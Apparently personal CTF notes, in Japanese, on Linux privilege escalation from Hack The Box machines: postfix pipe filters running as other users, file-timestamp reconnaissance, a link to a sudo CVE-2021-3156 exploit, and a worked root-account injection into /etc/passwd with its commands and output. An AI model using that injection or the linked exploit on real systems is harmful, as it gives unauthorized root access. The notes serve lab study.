# linux
----
## Run As
* rootで動作しているデーモンは、setuid関数およびexecuve関数で任意のユーザの子プロセスを生成しうる
* 例えばそのようなデーモンにcronや、postfix, systemdがある。
* postfixの場合、常駐しているプロセスはrootで動作するmasterプロセスおよび、postfixで動作する子プロセスである
* しかし、メール送信をトリガとして、rootでもpostfixでもない、第三者のユーザの子プロセスが生成される可能性がある
* メール送信などをトリガとして第三者のユーザの子プロセスが生成される場合、psなどのプロセス監視では前記第三者のユーザの子プロセスを見逃す懸念が高いため、コンフィグファイルをチェックする必要がある
  ```console
  kyle@writer:/etc/postfix$ ps aux | grep postfix
  root        2750  0.0  0.1  38036  4596 ?        Ss   Aug02   0:00 /usr/lib/postfix/sbin/master -w
  postfix     2752  0.0  0.1  38500  6100 ?        S    Aug02   0:00 qmgr -l -t unix -u
  postfix     2757  0.0  0.2  42100  9200 ?        S    Aug02   0:00 tlsmgr -l -t unix -u -c
  postfix   282071  0.0  0.1  38304  6168 ?        S    10:36   0:00 pickup -l -t unix -u -c
  kyle      282201  0.0  0.0   8160  2416 pts/1    R+   10:39   0:00 grep --color=auto postfix
  
  kyle@writer:/etc/postfix$ cat master.cf | grep -v '#'
  smtp      inet  n       -       y       -       -       smtpd -o content_filter=dfilt:
  
  pickup    unix  n       -       y       60      1       pickup
  cleanup   unix  n       -       y       -       0       cleanup
  qmgr      unix  n       -       n       300     1       qmgr
  tlsmgr    unix  -       -       y       1000?   1       tlsmgr
  rewrite   unix  -       -       y       -       -       trivial-rewrite
  bounce    unix  -       -       y       -       0       bounce
  defer     unix  -       -       y       -       0       bounce
  trace     unix  -       -       y       -       0       bounce
  verify    unix  -       -       y       -       1       verify
  flush     unix  n       -       y       1000?   0       flush
  proxymap  unix  -       -       n       -       -       proxymap
  proxywrite unix -       -       n       -       1       proxymap
  smtp      unix  -       -       y       -       -       smtp
  relay     unix  -       -       y       -       -       smtp
          -o syslog_name=postfix/$service_name
  showq     unix  n       -       y       -       -       showq
  error     unix  -       -       y       -       -       error
  retry     unix  -       -       y       -       -       error
  discard   unix  -       -       y       -       -       discard
  local     unix  -       n       n       -       -       local
  virtual   unix  -       n       n       -       -       virtual
  lmtp      unix  -       -       y       -       -       lmtp
  anvil     unix  -       -       y       -       1       anvil
  scache    unix  -       -       y       -       1       scache
  postlog   unix-dgram n  -       n       -       1       postlogd
  maildrop  unix  -       n       n       -       -       pipe
    flags=DRhu user=vmail argv=/usr/bin/maildrop -d ${recipient}
  uucp      unix  -       n       n       -       -       pipe
    flags=Fqhu user=uucp argv=uux -r -n -z -a$sender - $nexthop!rmail ($recipient)
  ifmail    unix  -       n       n       -       -       pipe
    flags=F user=ftn argv=/usr/lib/ifmail/ifmail -r $nexthop ($recipient)
  bsmtp     unix  -       n       n       -       -       pipe
    flags=Fq. user=bsmtp argv=/usr/lib/bsmtp/bsmtp -t$nexthop -f$sender $recipient
  scalemail-backend unix  -       n       n       -       2       pipe
    flags=R user=scalemail argv=/usr/lib/scalemail/bin/scalemail-store ${nexthop} ${user} ${extension}
  mailman   unix  -       n       n       -       -       pipe
    flags=FR user=list argv=/usr/lib/mailman/bin/postfix-to-mailman.py
    ${nexthop} ${user}
  dfilt     unix  -       n       n       -       -       pipe
    flags=Rq user=john argv=/etc/postfix/disclaimer -f ${sender} -- ${recipient}
  ```

## passwd
* Htb: Apocalyst
  ``` console
  falaraki@apocalyst:~$ openssl passwd -1 -salt salt password
  $1$salt$qJH7.N4xYta3aEG/dfqo/0
  falaraki@apocalyst:~$ echo 'test:$1$salt$qJH7.N4xYta3aEG/dfqo/0:0:0:root:root:/bin/bash' >> /etc/passwd
  falaraki@apocalyst:~$ su - test
  Password:
  No directory, logging in with HOME=/
  root@apocalyst:/root# id
  uid=0(root) gid=0(root) groups=0(root)
  ```

## Timestamp
### File Timestamp
* OSに後から追加されたソフトウェアはTimestampが新しくなる傾向がある
* 更に、手動で追加されたソフトウェアは秒以下のタイムスタンプが０になる傾向がある
* Htb: Time

  ```console
  pericles@time:/bin$ ls -la --time-style=full
  total 114472
  -rwxrw-rw-  1 pericles pericles       88 2021-10-01 10:30:01.705464997 +0000  timer_backup.sh
  drwxr-xr-x  2 root     root        36864 2021-02-09 14:42:59.226504740 +0000  .
  -rwxr-xr-x  1 root     root       273096 2021-01-19 14:21:02.000000000 +0000  cvtsudoers
  -rwsr-xr-x  1 root     root       166056 2021-01-19 14:21:02.000000000 +0000  sudo
  lrwxrwxrwx  1 root     root            4 2021-01-19 14:21:02.000000000 +0000  sudoedit -> sudo
  -rwxr-xr-x  1 root     root        64512 2021-01-19 14:21:02.000000000 +0000  sudoreplay
  lrwxrwxrwx  1 root     root           23 2020-10-20 12:34:58.201135565 +0000  jexec -> /etc/alternatives/jexec
  lrwxrwxrwx  1 root     root           21 2020-10-20 12:34:58.201135565 +0000  jfr -> /etc/alternatives/jfr
  lrwxrwxrwx  1 root     root           27 2020-10-20 12:34:58.197135579 +0000  unpack200 -> /etc/alternatives/unpack200
  lrwxrwxrwx  1 root     root           29 2020-10-20 12:34:58.193135594 +0000  rmiregistry -> /etc/alternatives/rmiregistry
  lrwxrwxrwx  1 root     root           21 2020-10-20 12:34:58.189135608 +0000  jjs -> /etc/alternatives/jjs
  lrwxrwxrwx  1 root     root           25 2020-10-20 12:34:58.189135608 +0000  pack200 -> /etc/alternatives/pack200
  lrwxrwxrwx  1 root     root           22 2020-10-20 12:34:58.185135622 +0000  java -> /etc/alternatives/java
  lrwxrwxrwx  1 root     root           25 2020-10-20 12:34:58.185135622 +0000  keytool -> /etc/alternatives/keytool
  lrwxrwxrwx  1 root     root           22 2020-10-20 12:34:58.181135637 +0000  rmid -> /etc/alternatives/rmid
  -rwxr-xr-x  1 root     root        14885 2020-10-06 15:47:56.000000000 +0000  phar.phar7.4
  lrwxrwxrwx  1 root     root           12 2020-10-06 15:47:56.000000000 +0000  phar7.4 -> phar.phar7.4
  -rwxr-xr-x  1 root     root      4773816 2020-10-06 15:47:56.000000000 +0000  php7.4
  ```
### Machine Create Timestamp
* マシンが作成された時間は、sshのssh_host*.keyから把握できる
* Htb: TheNoteBook

  ```console
  www-data@thenotebook:/etc/ssh$ ls
  total 596
  drwxr-xr-x 96 root root   4096 Feb 24  2021 ..
  drwxr-xr-x  2 root root   4096 Feb 12  2021 .
  -rw-r--r--  1 root root   3275 Feb 12  2021 sshd_config
  -rw-------  1 root root    411 Feb 12  2021 ssh_host_ed25519_key
  -rw-r--r--  1 root root     98 Feb 12  2021 ssh_host_ed25519_key.pub
  -rw-------  1 root root    227 Feb 12  2021 ssh_host_ecdsa_key
  -rw-r--r--  1 root root    178 Feb 12  2021 ssh_host_ecdsa_key.pub
  -rw-------  1 root root    668 Feb 12  2021 ssh_host_dsa_key
  -rw-r--r--  1 root root    606 Feb 12  2021 ssh_host_dsa_key.pub
  -rw-------  1 root root   1679 Feb 12  2021 ssh_host_rsa_key
  -rw-r--r--  1 root root    398 Feb 12  2021 ssh_host_rsa_key.pub
  -rw-r--r--  1 root root    338 Feb 12  2021 ssh_import_id
  -rw-r--r--  1 root root 553122 Mar  4  2019 moduli
  -rw-r--r--  1 root root   1580 Mar  4  2019 ssh_config
  
  www-data@thenotebook:/etc/ssh$ find / -newermt "2021-02-12" ! -newermt "2021-02-19"
  ```

## Sudo
### Sudo 1.9.5p1 (CVE-2021-3156) Heap-Based Buffer Overflow Privilege Escalation.
* [exploit](https://github.com/CyberCommands/exploit-sudoedit)